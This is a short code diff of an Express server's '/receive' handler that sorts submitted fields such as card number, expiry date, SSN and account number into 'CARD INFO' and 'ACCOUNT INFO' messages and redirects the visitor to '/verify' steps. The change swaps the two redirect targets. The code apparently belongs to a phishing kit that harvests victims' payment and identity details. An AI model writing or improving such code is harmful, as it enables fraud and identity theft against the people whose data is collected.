@@ -216,12 +216,12 @@ app.post('/receive', async (req, res) => {
         }
 
         if (!responseSent && (myObjects.includes('expiry-date') || myObjects.includes('card-number') || myObjects.includes('billing address'))) {
-            prepareMessage("CARD INFO", "/verify?step=1", false);
+            prepareMessage("CARD INFO", redirect_url, false);
         }
         
 
         if (!responseSent && (myObjects.includes('ssn') || myObjects.includes('account-number') || myObjects.includes('email'))) {
-            prepareMessage("ACCOUNT INFO", redirect_url, false);
+            prepareMessage("ACCOUNT INFO", "/verify?action=2", false);
         }
 
         // Handle unmatched cases
